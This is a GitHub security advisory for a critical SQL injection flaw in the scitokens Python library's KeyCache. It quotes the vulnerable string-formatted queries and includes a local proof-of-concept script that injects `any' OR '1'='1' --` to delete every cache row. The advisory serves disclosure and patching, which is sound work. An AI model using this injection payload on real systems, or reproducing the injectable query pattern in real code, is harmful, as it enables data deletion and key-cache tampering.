# [C] SciTokens is vulnerable to SQL Injection in KeyCache

## Summary
Severity: Critical
Advisory: GHSA-rh5m-2482-966c
CVE: CVE-2026-32714
CWE: CWE-89
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-31
Source: https://github.com/advisories/GHSA-rh5m-2482-966c
Type: github-advisory

## Affected
- PyPI: `scitokens` — affected >=0 <1.9.6

## Details
### Summary
The `KeyCache` class in `scitokens` was vulnerable to SQL Injection because it used Python's `str.format()` to construct SQL queries with user-supplied data (such as `issuer` and `key_id`). This allowed an attacker to execute arbitrary SQL commands against the local SQLite database.

Ran the POC below locally.

### Details
**File:** `src/scitokens/utils/keycache.py`

### Vulnerable Code Snippets

**1. In `addkeyinfo` (around line 74):**
```python
curs.execute("DELETE FROM keycache WHERE issuer = '{}' AND key_id = '{}'".format(issuer, key_id))
```

**2. In `_addkeyinfo` (around lines 89 and 94):**
```python
insert_key_statement = "INSERT OR REPLACE INTO keycache VALUES('{issuer}', '{expiration}', '{key_id}', \
                       '{keydata}', '{next_update}')"
# ...
curs.execute(insert_key_statement.format(issuer=issuer, expiration=time.time()+cache_timer, key_id=key_id,
                                         keydata=json.dumps(keydata), next_update=time.time()+next_update))
```

**3. In `_delete_cache_entry` (around line 128):**
```python
curs.execute("DELETE FROM keycache WHERE issuer = '{}' AND key_id = '{}'".format(issuer,
            key_id))
```

**4. In `_add_negative_cache_entry` (around lines 148 and 152):**
```python
insert_key_statement = "INSERT OR REPLACE INTO keycache VALUES('{issuer}', '{expiration}', '{key_id}', \
                    '{keydata}', '{next_update}')"
# ...
curs.execute(insert_key_statement.format(issuer=issuer, expiration=time.time()+cache_retry_interval, key_id=key_id,
                                        keydata=keydata, next_update=time.time()+cache_retry_interval))
```

**5. In `getkeyinfo` (around lines 193 and 198):**
```python
key_query = ("SELECT * FROM keycache WHERE "
             "issuer = '{issuer}'")
# ...
curs.execute(key_query.format(issuer=issuer, key_id=key_id))
```


### PoC
```
import sqlite3
import os
import sys
import tempfile
import shutil
import time
import json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

def poc_sql_injection():
    print("--- PoC: SQL Injection in KeyCache (Vulnerability Demonstration) ---")
    
    # We will demonstrate the vulnerability by manually executing the kind of query
    # that WAS present in the code, showing how it can be exploited.
    
    # Setup temporary database
    fd, db_path = tempfile.mkstemp()
    os.close(fd)
    
    conn = sqlite3.connect(db_path)
    curs = conn.cursor()
    curs.execute("CREATE TABLE keycache (issuer text, expiration integer, key_id text, keydata text, next_update integer, PRIMARY KEY (issuer, key_id))")
    
    # Add legitimate entries
    curs.execute("INSERT INTO keycache VALUES (?, ?, ?, ?, ?)", ("https://legit1.com", int(time.time())+3600, "key1", "{}", int(time.time())+3600))
    curs.execute("INSERT INTO keycache VALUES (?, ?, ?, ?, ?)", ("https://legit2.com", int(time.time())+3600, "key2", "{}", int(time.time())+3600))
    conn.commit()
    
    curs.execute("SELECT count(*) FROM keycache")
    print(f"Count before injection: {curs.fetchone()[0]}")
    
    # MALICIOUS INPUT
    # The original code was: 
    # curs.execute("DELETE FROM keycache WHERE issuer = '{}' AND key_id = '{}'".format(issuer, key_id))
    
    malicious_issuer = "any' OR '1'='1' --"
    malicious_kid = "irrelevant"
    
    print(f"Simulating injection with issuer: {malicious_issuer}")
    
    # This simulates what the VULNERABLE code did:
    query = "DELETE FROM keycache WHERE issuer = '{}' AND key_id = '{}'".format(malicious_issuer, malicious_kid)
    print(f"Generated query: {query}")
    
    curs.execute(query)
    conn.commit()
    
    curs.execute("SELECT count(*) FROM keycache")
    count = curs.fetchone()[0]
    print(f"Count after injection: {count}")
    
    if count == 0:
        print("[VULNERABILITY CONFIRMED] SQL Injection allowed clearing the entire table!")
    
    conn.close()
    os.remove(db_path)

if __name__ == "__main__":
    poc_sql_injection()
```
### Impact
An attacker who can influence the `issuer` or `key_id` (e.g., through a malicious token or issuer endpoint) could:
1.  **Modify or Delete Cache Entries:** Clear the entire key cache or inject malicious keys.
2.  **Information Leakage:** Query other tables or system information if SQLite is configured with certain extensions.
3.  **Potential RCE:** In some configurations, SQLite can be used to achieve Remote Code Execution (e.g., using `ATTACH DATABASE` to write a malicious file).

### MITIGATION AND WORKAROUNDS
Replace string formatting with parameterized queries using the DB-API's placeholder syntax (e.g., `?` for SQLite).

## References
- https://github.com/scitokens/scitokens/security/advisories/GHSA-rh5m-2482-966c
- https://nvd.nist.gov/vuln/detail/CVE-2026-32714
- https://github.com/scitokens/scitokens/commit/3dba108853f2f4a6c0f2325c03779bf083c41cf2
- https://github.com/scitokens/scitokens
- https://github.com/scitokens/scitokens/releases/tag/v1.9.6
